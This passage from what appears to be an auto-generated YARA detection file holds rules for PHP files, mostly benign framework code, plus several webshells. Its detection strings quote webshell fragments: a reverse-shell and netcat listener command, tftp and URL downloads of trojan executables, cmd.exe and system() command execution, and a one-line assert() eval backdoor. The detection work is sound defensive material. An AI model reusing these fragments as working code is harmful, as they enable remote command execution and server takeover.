      $s17 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s18 = "asename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s19 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s20 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule php22_phpspy2
{
   meta:
      description = "php22 - file phpspy2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dfdd38082a77377d1e96a769ef5757aab59ad8fc355dfdbb0d5a66d0484af888"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x6 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x7 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x10 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x11 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x13 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x14 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x15 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x16 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x17 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $x18 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $x19 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $x20 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}

rule ObjectValue
{
   meta:
      description = "php22 - file ObjectValue.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "211eb3dd9ac96071be65db8287e41ed08445d1bbdfdb8ec17fe362218904a32a"
   strings:
      $s1 = "$targetList = $this->resolveOptions($config['target'], 'target');" fullword ascii
      $s2 = "$fieldGetter = 'get' . ucfirst($targetList['fieldname']);" fullword ascii
      $s3 = "throw new \\InvalidArgumentException(sprintf('Resolver with name \"%s\" is not defined', $resolverName));" fullword ascii
      $s4 = "namespace Pimcore\\Bundle\\EcommerceFrameworkBundle\\IndexService\\Interpreter;" fullword ascii
      $s5 = "use Pimcore\\Bundle\\EcommerceFrameworkBundle\\Traits\\OptionsResolverTrait;" fullword ascii
      $s6 = "return $value->$fieldGetter($targetList['locale']);" fullword ascii
      $s7 = "protected function configureOptionsResolver(string $resolverName, OptionsResolver $resolver)" fullword ascii
      $s8 = "->setAllowedTypes('target', 'array');" fullword ascii
      $s9 = "} elseif ('target' === $resolverName) {" fullword ascii
      $s10 = "->setDefined('target')" fullword ascii
      $s11 = "if (method_exists($value, $fieldGetter)) {" fullword ascii
      $s12 = "use Symfony\\Component\\OptionsResolver\\OptionsResolver;" fullword ascii
      $s13 = "public function interpret($value, $config = null)" fullword ascii
      $s14 = "use Pimcore\\Model\\DataObject\\AbstractObject;" fullword ascii
      $s15 = "$resolver->setAllowedTypes($field, 'string');" fullword ascii
      $s16 = "$resolver->setRequired($fields);" fullword ascii
      $s17 = "$config     = $this->resolveOptions($config ?? []);" fullword ascii
      $s18 = "if ('default' === $resolverName) {" fullword ascii
      $s19 = "if ($value instanceof AbstractObject) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}



rule PhptTestCaseTest
{
   meta:
      description = "php22 - file PhptTestCaseTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8e237a291584ea473be963c2f0ae0675ee711a74151a9e946166c95a69d5eb9a"
   strings:
      $s1 = "* @var AbstractPhpProcess|\\PHPUnit\\Framework\\MockObject\\MockObject" fullword ascii
      $s2 = "$this->phpProcess = $this->getMockForAbstractClass(AbstractPhpProcess::class, [], '', false);" fullword ascii
      $s3 = "* Ensures the correct line ending is used for comparison" fullword ascii
      $s4 = "* Defines the content of the current PHPT test." fullword ascii
      $s5 = "$this->dirname  = \\sys_get_temp_dir();" fullword ascii
      $s6 = "private $phpProcess;" fullword ascii
      $s7 = "use PHPUnit\\Util\\PHP\\AbstractPhpProcess;" fullword ascii
      $s8 = "$this->setPhpContent($this->ensureCorrectEndOfLine(self::EXPECT_CONTENT));" fullword ascii
      $s9 = "$this->phpProcess = null;" fullword ascii
      $s10 = "public function testShouldNotRunTestSectionIfSkipifSectionReturnsOutputWithSkipWord(): void" fullword ascii
      $s11 = "->will($this->returnValue(['stdout' => 'Hello PHPUnit!', 'stderr' => '']));" fullword ascii
      $s12 = "private function ensureCorrectEndOfLine($content)" fullword ascii
      $s13 = "$this->phpProcess" fullword ascii
      $s14 = "public function testShouldThrowsAnExceptionWhenThereIsNoExpecOrExpectifOrExpecregexSectionInPhptFile(): void" fullword ascii
      $s15 = "$phptContent .= \"<?php echo 'skip: ' . __FILE__; ?>\" . PHP_EOL;" fullword ascii
      $s16 = "private const EXPECTREGEX_CONTENT = <<<EOF" fullword ascii
      $s17 = "* (c) Sebastian Bergmann <sebastian@phpunit.de>" fullword ascii
      $s18 = "private function setPhpContent($content): void" fullword ascii
      $s19 = "private const EXPECT_CONTENT = <<<EOF" fullword ascii
      $s20 = "private const EXPECTF_CONTENT = <<<EOF" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule OrderItemUnitSpec
{
   meta:
      description = "php22 - file OrderItemUnitSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "accb0c9e503bfdadc8f135cabd747019e8896ce5df7ff1e853de37aa172ad6f6"
   strings:
      $s1 = "function it_adds_and_removes_adjustments(AdjustmentInterface $adjustment, OrderItemInterface $orderItem): void" fullword ascii
      $s2 = "$adjustment2->getAmount()->willReturn(50);" fullword ascii
      $s3 = "$adjustment->getAmount()->willReturn(-1400);" fullword ascii
      $s4 = "$adjustment1->getAmount()->willReturn(100);" fullword ascii
      $s5 = "$orderItem->getUnitPrice()->willReturn(500);" fullword ascii
      $s6 = "$adjustment2->getAmount()->willReturn(150);" fullword ascii
      $s7 = "$adjustment->getAmount()->willReturn(200);" fullword ascii
      $s8 = "$adjustment3->getAmount()->willReturn(250);" fullword ascii
      $s9 = "$adjustment->getAmount()->willReturn(400);" fullword ascii
      $s10 = "$orderItem->getUnitPrice()->willReturn(1000);" fullword ascii
      $s11 = "use Sylius\\Component\\Order\\Model\\OrderItemInterface;" fullword ascii
      $s12 = "use Sylius\\Component\\Order\\Model\\AdjustmentInterface;" fullword ascii
      $s13 = "use Sylius\\Component\\Order\\Model\\OrderItemUnitInterface;" fullword ascii
      $s14 = "$this->getTotal()->shouldReturn(1250);" fullword ascii
      $s15 = "$this->getTotal()->shouldReturn(1400);" fullword ascii
      $s16 = "$this->getTotal()->shouldReturn(0);" fullword ascii
      $s17 = "$this->getTotal()->shouldReturn(1150);" fullword ascii
      $s18 = "$this->getTotal()->shouldReturn(650);" fullword ascii
      $s19 = "$this->getTotal()->shouldReturn(1000);" fullword ascii
      $s20 = "$this->getTotal()->shouldReturn(1300);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule php22_Option
{
   meta:
      description = "php22 - file Option.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e9a0c8a1fbbe67e872d9bbdbce523fb55dbb326c9e37a64e099988d17bed668a"
   strings:
      $s1 = "<option value=\"<?= $shortcode->getParameter('value'); ?>\"><?= $shortcode->getParameter('label'); ?></option>" fullword ascii
   condition:
      uint16(0) == 0x6f3c and filesize < 1KB and
      all of them
}

rule RedisArrayStoreTest
{
   meta:
      description = "php22 - file RedisArrayStoreTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b5a9e018db3bed2f6a31bd68da66d965d7a2ac86669e8fa2871cdb8cf20faf83"
   strings:
      $s1 = "if (!@((new \\Redis())->connect(getenv('REDIS_HOST')))) {" fullword ascii
      $s2 = "$redis = new \\RedisArray(array(getenv('REDIS_HOST')));" fullword ascii
      $s3 = "protected function getRedisConnection()" fullword ascii
      $s4 = "<jeremy@derusse.com>" fullword ascii
      $s5 = "* @author J" fullword ascii
      $s6 = "* @requires extension redis" fullword ascii
      $s7 = "$e = error_get_last();" fullword ascii
      $s8 = "namespace Symfony\\Component\\Lock\\Tests\\Store;" fullword ascii
      $s9 = "self::markTestSkipped($e['message']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule PrincipalTest
{
   meta:
      description = "php22 - file PrincipalTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d71c6e7a9e83a7611f144f6ca7a8a4e8b97e356d85aa3a5cf0ff23b614815a31"
   strings:
      $s1 = "$this->assertEquals('admin@example.org', $props['{http://sabredav.org/ns}email-address']);" fullword ascii
      $s2 = "$this->assertNull($principal->getSupportedPrivilegeSet());" fullword ascii
      $s3 = "function testGetAlternateUriSetEmpty() {" fullword ascii
      $s4 = "function testGetSupportedPrivilegeSet() {" fullword ascii
      $s5 = "'{http://sabredav.org/ns}email-address' => 'admin@example.org'," fullword ascii
      $s6 = "'{http://sabredav.org/ns}email-address'," fullword ascii
      $s7 = "* @expectedException \\Sabre\\DAV\\Exception\\Forbidden" fullword ascii
      $s8 = "$this->assertEquals($expected, $principal->getAlternateUriSet());" fullword ascii
      $s9 = "$props = $principal->getProperties($keys);" fullword ascii
      $s10 = "* @expectedException Sabre\\DAV\\Exception" fullword ascii
      $s11 = "$this->assertEquals('principals/admin', $principal->getOwner());" fullword ascii
      $s12 = "$this->assertEquals('principals/admin', $principal->getPrincipalUrl());" fullword ascii
      $s13 = "$this->assertEquals([], $principal->getGroupMemberSet());" fullword ascii
      $s14 = "$this->assertEquals([], $principal->getGroupMembership());" fullword ascii
      $s15 = "$this->assertEquals('admin', $principal->getDisplayname());" fullword ascii
      $s16 = "$this->assertEquals('Mr. Admin', $principal->getDisplayname());" fullword ascii
      $s17 = "'{http://www.example.org/custom}custom' => 'Custom'," fullword ascii
      $s18 = "'{http://www.example.org/custom}custom'," fullword ascii
      $s19 = "$this->assertEquals('admin', $principal->getName());" fullword ascii
      $s20 = "foreach ($keys as $key) $this->assertArrayHasKey($key, $props);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule ProductTranslation
{
   meta:
      description = "php22 - file ProductTranslation.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1cb62b8fed38080a8e5bf9e6b14fd8d7b9388a2fd019704539168bca255789e3"
   strings:
      $s1 = "public function getMetaKeywords(): ?string" fullword ascii
      $s2 = "public function getDescription(): ?string" fullword ascii
      $s3 = "public function getMetaDescription(): ?string" fullword ascii
      $s4 = "public function setMetaDescription(?string $metaDescription): void" fullword ascii
      $s5 = "public function setMetaKeywords(?string $metaKeywords): void" fullword ascii
      $s6 = "public function setDescription(?string $description): void" fullword ascii
      $s7 = "use Sylius\\Component\\Resource\\Model\\AbstractTranslation;" fullword ascii
      $s8 = "public function getSlug(): ?string" fullword ascii
      $s9 = "public function getName(): ?string" fullword ascii
      $s10 = "$this->metaDescription = $metaDescription;" fullword ascii
      $s11 = "namespace Sylius\\Component\\Product\\Model;" fullword ascii
      $s12 = "$this->metaKeywords = $metaKeywords;" fullword ascii
      $s13 = "class ProductTranslation extends AbstractTranslation implements ProductTranslationInterface" fullword ascii
      $s14 = "return $this->metaKeywords;" fullword ascii
      $s15 = "return $this->metaDescription;" fullword ascii
      $s16 = "protected $metaDescription;" fullword ascii
      $s17 = "protected $metaKeywords;" fullword ascii
      $s18 = "public function setSlug(?string $slug): void" fullword ascii
      $s19 = "public function setName(?string $name): void" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule php22_record
{
   meta:
      description = "php22 - file record.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "71e08f6f00e5b20e2d04b0228ee2d37a78687613c70f17c034e736a454d69b85"
   strings:
      $s1 = "* @uses $vars['entity'] Target entity of the subscription" fullword ascii
      $s2 = "* @tip for correct styling this view should be wrapped in an element with the class 'elgg-subscription-record'" fullword ascii
      $s3 = "* Displays a subscription record with preference choices" fullword ascii
      $s4 = "if (check_entity_relationship($user->guid, \"notify{$method}\", $entity->guid)) {" fullword ascii
      $s5 = "echo elgg_format_element('div', ['class' => 'elgg-subscription-description'], elgg_view_image_block($icon, $name));" fullword ascii
      $s6 = "*      which is wrapped in an element with the class 'elgg-subscriptions'" fullword ascii
      $s7 = "* @uses $vars['user']   Subscriber" fullword ascii
      $s8 = "$relationships_concat = $entity->getVolatileData('select:relationships');" fullword ascii
      $s9 = "if (!$entity instanceof ElggEntity || !$user instanceof ElggUser || !$user->canEdit()) {" fullword ascii
      $s10 = "$name = $entity->getDisplayName();" fullword ascii
      $s11 = "'src' => $entity->getIconURL('tiny')," fullword ascii
      $s12 = "'alt' => $entity->getDisplayName()," fullword ascii
      $s13 = "// This volatile data is stored during a query with a custom select option" fullword ascii
      $s14 = "'name' => \"subscriptions[$entity->guid]\"," fullword ascii
      $s15 = "$user = elgg_extract('user', $vars);" fullword ascii
      $s16 = "$method = str_replace('notify', '', $relationship);" fullword ascii
      $s17 = "$methods = elgg_get_notification_methods();" fullword ascii
      $s18 = "$entity = elgg_extract('entity', $vars);" fullword ascii
      $s19 = "if (0 === strpos($relationship, 'notify')) {" fullword ascii
      $s20 = "foreach ($relationships as $relationship) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule PHPsimple
{
   meta:
      description = "php22 - file PHPsimple.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6bc91235be9b378a741b406a708d20b894b371f8915c38d354ab6f486739527e"
   strings:
      $s1 = "- ExpDoor.com</title>" fullword ascii
      $s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILENAME\"];?>'><br><br>" fullword ascii
      $s3 = "if(fwrite($f,$_POST[\"c\"]))" fullword ascii
      $s4 = "echo \"<font color=blue>Error!</font>\";" fullword ascii
      $s5 = "$f=fopen($_POST[\"f\"],\"w\");" fullword ascii
      $s6 = "if ($_POST)" fullword ascii
      $s7 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword ascii
      $s8 = "<input type=\"submit\" id=\"b\" value=\"Create\"><br>" fullword ascii
      $s9 = "echo \"<font color=red>OK!</font>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule php22_proxy
{
   meta:
      description = "php22 - file proxy.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "63964c31d142ed6c579da6153655e8b6f1a5e3aa206d2933dff76b37d2682770"
   strings:
      $x1 = "// Simple - http://benalman.com/code/projects/php-simple-proxy/examples/simple/" fullword ascii
      $x2 = "list( $header, $contents ) = preg_split( '/([\\r\\n][\\r\\n])\\\\1/', curl_exec( $ch ), 2 );" fullword ascii
      $x3 = "// Project Home - http://benalman.com/projects/php-simple-proxy/" fullword ascii
      $s4 = "// Source       - http://github.com/cowboy/php-simple-proxy/raw/master/ba-simple-proxy.php" fullword ascii
      $s5 = "//   headers - (Object) A hash of HTTP headers returned by the remote URL" fullword ascii
      $s6 = "curl_setopt( $ch, CURLOPT_USERAGENT, @$_GET['user_agent'] ? @$_GET['user_agent'] : @$_SERVER['HTTP_USER_AGENT'] );" fullword ascii
      $s7 = "// GitHub       - http://github.com/cowboy/php-simple-proxy/" fullword ascii
      $s8 = "// Certain GET (query string) parameters may be passed into ba-simple-proxy.php" fullword ascii
      $s9 = "//   url - The remote URL resource to fetch. Any GET parameters to be passed" fullword ascii
      $s10 = "//   user_agent - This value will be sent to the remote URL request as the" fullword ascii
      $s11 = "// > ba-simple-proxy.php?url=http://example.com/&mode=native" fullword ascii
      $s12 = "//   send_cookies - If send_cookies=1, all cookies will be forwarded through to" fullword ascii
      $s13 = "//     `User-Agent:` HTTP request header. If omitted, the browser user agent" fullword ascii
      $s14 = "// > ba-simple-proxy.php?url=http://example.com/" fullword ascii
      $s15 = "// was received in, including the same content-type and other headers (but only" fullword ascii
      $s16 = "//     through to the remote URL resource must be urlencoded in this parameter." fullword ascii
      $s17 = "//   contents - (String) The contents of the remote URL resource." fullword ascii
      $s18 = "// Script: Simple PHP Proxy: Get external HTML, JSON and more!" fullword ascii
      $s19 = "header( 'Content-type: application/' . ( $is_xhr ? 'json' : 'x-javascript' ) );" fullword ascii
      $s20 = "//   full_headers - If a JSON request and full_headers=1, the JSON response will" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule PhakeClientTest
{
   meta:
      description = "php22 - file PhakeClientTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a08f8baae3fc5f9e81f214ffa74b7242bbdb88f953b8f82a154f3f7fd9ece516"
   strings:
      $s1 = "$client = Phake::getClient();" fullword ascii
      $s2 = "$this->assertInstanceOf('Phake_Client_PHPUnit6', $client);" fullword ascii
      $s3 = "$clientProperty = $refClass->getProperty('client');" fullword ascii
      $s4 = "public function testAutoDetectsPHPUnitClient()" fullword ascii
      $s5 = "$clientProperty->setAccessible(true);" fullword ascii
      $s6 = "$clientProperty->setValue(null);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_shell_assert
{
   meta:
      description = "php22 - file php-shell-assert.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dbdbb45247aa7b76c8cadf58c1392f668ca7d92a39d5d1dc9e2ecb9d03b0f514"
   strings:
      $s1 = "assert('$code=function() {'.$_REQUEST['code'].'}');" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule RequestHandlingTest
{
   meta:
      description = "php22 - file RequestHandlingTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d26579364351b3a2e44626d4abac133037ad5997207f0239d440e4131ba3dec5"
   strings:
      $s1 = "/* We no longer support using hacky attempting to handle URL parsing with broken rules */" fullword ascii
      $s2 = "'Should fail: Invocation through POST form handler, not contained in $allowed_actions, without CSRF token'" fullword ascii
      $s3 = "/* Request handlers can be chained, from Director to Controller to Form to FormField.  Here, we can make a get" fullword ascii
      $s4 = "'Should fail: Invocation through POST form handler, contained in $allowed_actions, without CSRF token'" fullword ascii
      $s5 = "public function testFormActionsCanBypassAllowedActions()" fullword ascii
      $s6 = "'Should fail: Invocation through POST URL, not contained in $allowed_actions, without CSRF token'" fullword ascii
      $s7 = "$this->assertInstanceOf('SilverStripe\\\\Control\\\\NullHTTPRequest', $r->getRequest());" fullword ascii
      $s8 = "$this->assertEquals('There was an internal server error.', $responseException->getBody());" fullword ascii
      $s9 = "$this->assertEquals(\"\\$this->urlParams can be used, for backward compatibility: 3, 4\", $response->getBody());" fullword ascii
      $s10 = "/* We can also make a POST request on a form field, which could be used for in-place editing, for example. */" fullword ascii
      $s11 = "Director::test('/silverstripe/testGoodBase1/TestForm/fields/MyField', array('MyField' => 5))->getBody()" fullword ascii
      $s12 = "'Should pass: Invocation of form action through POST URL, contained in $allowed_actions, without CSRF token'" fullword ascii
      $s13 = "$response = Director::test(\"testGoodBase1/TestForm\", array(\"MyField\" => 3), null, \"POST\");" fullword ascii
      $s14 = "'Should pass: Invocation through POST form handler, controller action instead of form action, contained in'" fullword ascii
      $s15 = "'Should pass: Invocation of form action through POST URL, contained in $allowed_actions, with CSRF token'" fullword ascii
      $s16 = "/* The HTTP Request handler can trigger special behaviour for GET and POST. */" fullword ascii
      $s17 = "$tokenEls = $this->cssParser()->getBySelector('#Form_Form_SecurityID');" fullword ascii
      $s18 = "'Should pass: Invocation through POST form handler, contained in $allowed_actions, with CSRF token'" fullword ascii
      $s19 = "/* The failoverMethod action wasn't explicitly listed and so isnt' allowed */" fullword ascii
      $s20 = "$response = Director::test(\"testBadBase/TestForm\", array(\"MyField\" => 3), null, \"POST\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule ResetCommand
{
   meta:
      description = "php22 - file ResetCommand.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7b5327d389b4c81e59b5ef18ab4122f4369dceb5590457646a6fccef95c675be"
   strings:
      $x1 = "More info at http://documentation.concrete5.org/developers/appendix/cli-commands#c5-reset" fullword ascii
      $s2 = "throw new Exception(\"You have to specify the --force option in order to run this command\");" fullword ascii
      $s3 = "protected function execute(InputInterface $input, OutputInterface $output)" fullword ascii
      $s4 = "$output->write(\"Dropping foreign key {$table->getName()}.{$foreignKey->getName()}... \");" fullword ascii
      $s5 = "'application/config/site_install_user.php' => DIR_CONFIG_SITE . '/site_install_user.php'," fullword ascii
      $s6 = "/* @var $cn \\Concrete\\Core\\Database\\Connection\\Connection */" fullword ascii
      $s7 = "namespace Concrete\\Core\\Console\\Command;" fullword ascii
      $s8 = "foreach ($table->getForeignKeys() as $foreignKey) {" fullword ascii
      $s9 = "if (!$this->getHelper('question')->ask($input, $output, $confirmQuestion)) {" fullword ascii
      $s10 = "use Concrete\\Core\\Console\\Command;" fullword ascii
      $s11 = "'application/config/generated_overrides' => DIR_CONFIG_SITE . '/generated_overrides'," fullword ascii
      $s12 = "->setDescription('Reset the concrete5 installation, deleting files and emptying the database')" fullword ascii
      $s13 = "/* @var $fh \\Concrete\\Core\\File\\Service\\File */" fullword ascii
      $s14 = "if (Database::getDefaultConnection()) {" fullword ascii
      $s15 = "0 operation completed successfully" fullword ascii
      $s16 = "use Symfony\\Component\\Console\\Question\\ConfirmationQuestion;" fullword ascii
      $s17 = "'application/config/site_install.php' => DIR_CONFIG_SITE . '/site_install.php'," fullword ascii
      $s18 = "$sm->dropForeignKey($foreignKey, $table);" fullword ascii
      $s19 = "class ResetCommand extends Command" fullword ascii
      $s20 = "use Symfony\\Component\\Console\\Output\\OutputInterface;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule RequiresCasting
{
   meta:
      description = "php22 - file RequiresCasting.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "81e702daaff8bfe441bd1abd37ba27e84f842da2d2b6a5894d48cccc3bf82240"
   strings:
      $s1 = "public function forTemplate()" fullword ascii
      $s2 = "namespace SilverStripe\\View\\Tests\\ViewableDataTest;" fullword ascii
      $s3 = "use SilverStripe\\Dev\\TestOnly;" fullword ascii
      $s4 = "use SilverStripe\\View\\ViewableData;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule RemoteWithPHPUnitCept
{
   meta:
      description = "php22 - file RemoteWithPHPUnitCept.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9bb336a2e5c6cd5abfd6db39407e4e26c80715cd2bd94a49b70d22351b033064"
   strings:
      $x1 = "$I->executeCommand('run remote --coverage-phpunit');" fullword ascii
      $s2 = "$I->seeFileFound('index.xml', 'tests/_output/coverage-phpunit');" fullword ascii
      $s3 = "$I->seeCoverageStatsNotEmpty();" fullword ascii
      $s4 = "$I->wantTo('try generate remote codecoverage phpunit report');" fullword ascii
      $s5 = "$I = new CoverGuy($scenario);" fullword ascii
      $s6 = "$I->amInPath('tests/data/sandbox');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule req_fields_pre_process
{
   meta:
      description = "php22 - file req-fields-pre-process.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7ca3f607d62fb65d220f5d797346aa6fc8cf1d01c670f5f3d27209442ab738bb"
   strings:
      $s1 = "$field_row = $ninja_forms_processing->get_field_settings( $field_id );" fullword ascii
      $s2 = "$ninja_forms_processing->add_error('required-general', $req_error_label, 'general');" fullword ascii
      $s3 = "$ninja_forms_processing->add_error('required-'.$field_id, $req_field_error, $field_id);" fullword ascii
      $s4 = "$all_fields = $ninja_forms_processing->get_all_fields();" fullword ascii
      $s5 = "add_action( 'ninja_forms_pre_process', 'ninja_forms_req_fields_process', 13);" fullword ascii
      $s6 = "global $ninja_forms_processing, $ninja_forms_fields;" fullword ascii
      $s7 = "function ninja_forms_req_fields_process(){" fullword ascii
      $s8 = "if( $user_value == $label OR ( empty( $user_value ) && $user_value !== \"0\" ) ){" fullword ascii
      $s9 = "$req_error_label = __( 'Please check required fields.', 'ninja-forms' );" fullword ascii
      $s10 = "$req_field_error = __( $plugin_settings['req_field_error'], 'ninja-forms' );" fullword ascii
      $s11 = "$req_error_label = __( $plugin_settings['req_error_label'], 'ninja-forms' );" fullword ascii
      $s12 = "$field_row = ninja_forms_get_field_by_id( $field_id );" fullword ascii
      $s13 = "$req_field_error = __( 'This is a required field.', 'ninja-forms' );" fullword ascii
      $s14 = "if ( isset ( $field_data['req'] ) and $field_data['req'] == 1 and $label_pos == 'inside' ) {" fullword ascii
      $s15 = "foreach($all_fields as $field_id => $user_value){" fullword ascii
      $s16 = "if( isset( $plugin_settings['req_error_label'] ) ){" fullword ascii
      $s17 = "$plugin_settings = nf_get_settings();" fullword ascii
      $s18 = "// Get the required field symbol." fullword ascii
      $s19 = "if ( isset ( $plugin_settings['req_field_error'] ) ) {" fullword ascii
      $s20 = "$settings = nf_get_settings();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule page_fullwidth
{
   meta:
      description = "php22 - file page-fullwidth.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "738264cbe56c28a2c6b0c1d0b1bcb7682f33bded1daf5650cb6cfc13b945f49a"
   strings:
      $s1 = "<?php get_template_part( 'template-parts/content', 'page' ); ?>" fullword ascii
      $s2 = "* This is the template that displays full width page without sidebar" fullword ascii
      $s3 = "* Template Name: Full-width(no sidebar)" fullword ascii
      $s4 = "</div><!-- close .main-content-inner -->" fullword ascii
      $s5 = "if ( comments_open() || '0' != get_comments_number() ) :" fullword ascii
      $s6 = "if ( get_theme_mod( 'sparkling_page_comments', 1 ) == 1 ) :" fullword ascii
      $s7 = "</main><!-- #main -->" fullword ascii
      $s8 = "* @package sparkling" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule RadioTest
{
   meta:
      description = "php22 - file RadioTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "aea54c27da6b646e2ab4ec0bccc2a9b15b14c3844a5916e7ec548a30a5cfd576"
   strings:
      $s1 = "* @param  mixed $disabled If 'disabled', rendered as `disabled=\"disabled\"`. If true, then rendered as `disabled`." fullword ascii
      $s2 = "$matcher  = $this->controlGroup('<input value=\"bar\" id=\"foo\" type=\"radio\" name=\"foo\" checked=\"checked\">');" fullword ascii
      $s3 = "$matcher = $this->formGroup($this->matchRadio('foo', 'Foo', 0, true).$this->matchRadio('foo2', 'Bar', 1, true));" fullword ascii
      $s4 = "$matcher = $this->controlGroup($this->matchRadio('foo', 'Foo', 0, true).$this->matchRadio('foo2', 'Bar', 1, true));" fullword ascii
      $s5 = "$radios  = $this->former->radios('foo')->radios('foo', 'bar')->check(array(0 => false, 1 => true))->__toString();" fullword ascii
      $s6 = "private function matchCheckedRadio($name = 'foo', $label = null, $value = 1, $inline = false)" fullword ascii
      $s7 = "$matcher = $this->controlGroup($this->matchCheckedRadio('foo', 'Foo', 0).$this->matchRadio('foo2', 'Bar', 1));" fullword ascii
